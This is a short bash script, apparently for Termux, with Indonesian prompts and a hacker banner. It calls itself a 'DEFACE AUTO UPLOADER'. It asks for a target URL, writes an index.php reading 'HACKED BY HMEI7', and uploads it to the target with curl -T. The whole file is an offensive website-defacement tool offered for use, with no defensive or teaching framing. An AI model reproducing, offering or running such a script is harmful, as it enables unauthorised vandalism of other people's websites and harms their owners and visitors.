#!/bin/bash
clear
blue='\033[34;1m'
green='\033[32;1m'
cyan='\033[36;1m'
purple='\033[35;1m'
yellow='\033[33;1m'
white='\033[37;1m'
red='\033[31;1m'

echo "█████████"  | lolcat
echo "█▄█████▄█  \033[32;1m●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬● " | lolcat
echo "█ ▼▼▼▼▼                " | lolcat
echo "█                     " | lolcat
echo "█ ▲▲▲▲▲               " | lolcat
echo "█████████     ☠◢◤◢█◆━━━━◆⚔⚔◆━━━◆█◣◥◣☠ " | lolcat
echo " ██ ██ " | lolcat
echo $cyan "╔════════════════════════════════════════════════╗" 
echo $cyan "║ * \033[37;1m[Author]  : \033[33;1mMr.Maxim                    \033[36;1m║"
echo $cyan "║ * \033[33;1m[Git]     : \033[37;1mhttps://gitlab.com/TXC_19/  \033[36;1m║"
echo $cyan "║ * \033[37;1m[TOOLS]   : \033[33;1mDEFACE AUTO UPLOADER        \033[36;1m║"
echo $cyan "║ * \033[33;1m[Versi]   : \033[37;1m0.2                         \033[36;1m║"
echo $cyan "╚════════════════════════════════════════════════╝"
date | lolcat
echo

echo $green "Masukkan URL target (contoh: http://example.com)"
read -p ">> " target

# Membuat file index.php otomatis
echo "<?php" > /storage/emulated/0/index.php
echo "echo '<html>';" >> /storage/emulated/0/index.php
echo "echo '<h1>SELAMAT MALAM SRIGALA HITAM</h1>';" >> /storage/emulated/0/index.php
echo "echo '<h1>HACKED BY HMEI7</h1>';" >> /storage/emulated/0/index.php
echo "echo '</html>';" >> /storage/emulated/0/index.php
echo "?>" >> /storage/emulated/0/index.php

# Upload menggunakan curl
echo $green "Mengupload file index.php ke: $target"
sleep 2
curl -T /storage/emulated/0/index.php "$target"

echo
echo $green "Upload selesai!"
echo $cyan "Cek hasil di browser: $target"
echo $yellow "Terima kasih telah menggunakan tool ini"